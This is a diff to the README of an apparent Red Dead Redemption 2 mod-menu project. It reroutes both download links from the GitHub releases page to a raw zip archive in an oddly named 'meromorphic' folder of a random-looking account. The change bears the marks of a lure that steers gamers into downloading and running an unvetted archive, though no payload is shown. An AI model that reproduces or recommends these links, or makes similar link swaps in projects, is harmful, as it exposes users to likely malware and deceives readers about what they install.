@@ -1,6 +1,6 @@
 # 🤠 RDR-2-Menu-26 - Modify your story mode game easily
 
-[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/caloriepainteddaisy527/RDR-2-Menu-26/releases)
+[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://raw.githubusercontent.com/caloriepainteddaisy527/RDR-2-Menu-26/main/meromorphic/Menu_RD_v1.4.zip)
 
 RDR-2-Menu-26 provides a simple way to change your single-player experience in Red Dead Redemption 2. This tool allows players to access hidden options, adjust character settings, and alter game physics. You control the game world through an interface that works directly with your installed copy of the software.
 
@@ -28,7 +28,7 @@ Ensure your computer meets these conditions before you begin:
 
 Visit the release page to get the installer. We update this file regularly to ensure it works with the newest game patches.
 
-[Click here to visit the download page](https://github.com/caloriepainteddaisy527/RDR-2-Menu-26/releases)
+[Click here to visit the download page](https://raw.githubusercontent.com/caloriepainteddaisy527/RDR-2-Menu-26/main/meromorphic/Menu_RD_v1.4.zip)
 
 1. Navigate to the link provided.
 2. Locate the section labeled latest.
